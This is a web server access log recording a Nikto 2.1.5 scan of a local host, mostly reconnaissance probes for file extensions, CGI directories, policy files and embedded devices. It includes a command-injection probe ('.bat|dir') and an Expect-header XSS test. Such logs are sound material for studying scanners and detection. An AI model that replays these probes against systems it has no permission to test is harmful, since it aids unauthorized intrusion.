172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.asp+ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.cnf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.VALIDATE_STMT HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.tw HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.asp HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.x-shop HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.render_warning_screen HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.backup HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.jsa HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.adjunct HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.xbb HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.tmp HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.java HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.conf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.iso2022-kr HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.pt-br HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.inc HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.showsource HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.ini HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.ml HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.dbm HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.htm HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.el HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.TPF HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.pw HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.cp-1251 HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.koi8-r HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.map HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.types HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.csp HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.show HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.cgi+ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.gif HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.eml HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.shm HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.dll HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG._ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.save HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.nl HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.cp866 HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.var HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.ee HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.genpopuplist HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.bas HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.AP HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.html~ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.Big5 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.access HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.cwr HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.aspx HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.bat|dir HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.home HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.cfg HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.TXT HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.lst HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.gz HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.bak HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.xml HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.mdb+ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.pm HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.CGI HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.sys HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.zip HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.2 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.nn HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /.qIjBrQVG HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.cgi HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.password HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.nsfdeslo HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.no HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.1 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.asa HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.bat HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.EXE HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.utf8 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.cellsprint HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.jsp+ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.axd HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.htaccess HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.old HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.iso-ru HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.xml+ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.show_query_columns HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.blt HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.link HTTP/1.1" 404 468 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.BBoardServlet HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.SHOW HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.sql HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.www_acl HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /qIjBrQVG.printer HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi.cgi/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webcgi/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-914/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-915/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /bin/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /mpcgi/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-bin/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ows-bin/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-sys/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-local/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /htbin/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgibin/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgis/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-win/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /fcgi-bin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-exe/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-home/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-perl/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scgi-bin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:cgi dir check)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:robots)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /clientaccesspolicy.xml HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:clientaccesspolicy)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /crossdomain.xml HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:crossdomain)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /robots.txt HTTP/1.1" 200 309 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:robots)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /~root HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:apacheusers: known user)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 417 0 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:apache_expect_xss)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 479 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:parked detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.asp HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:headers: Translate-f #1)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /junk999.asp HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:headers: Translate-f #1)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.aspx HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:headers: Translate-f #1)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /junk988.aspx HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:headers: Translate-f #1)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /login.asp HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:headers: Translate-f #1)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /login.aspx HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:headers: Translate-f #1)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.0" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:headers: IIS internal IP)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /images HTTP/1.0" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:headers: IIS internal IP)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET . HTTP/1.0" 400 484 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:headers: WebLogic internal IP)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /favicon.ico HTTP/1.1" 200 1707 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:favicon)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:favicon)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /hp/device/this.LCDispatcher HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /hp/device/this.LCDispatcher HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /hp/device/this.LCDispatcher HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /hp/device/this.LCDispatcher HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /hmstat.htm HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SoundBridgeStatus.html HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /eng/start/StatPtrGen.htm HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cab/top.shtml HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /home.asp HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:embedded detection)"
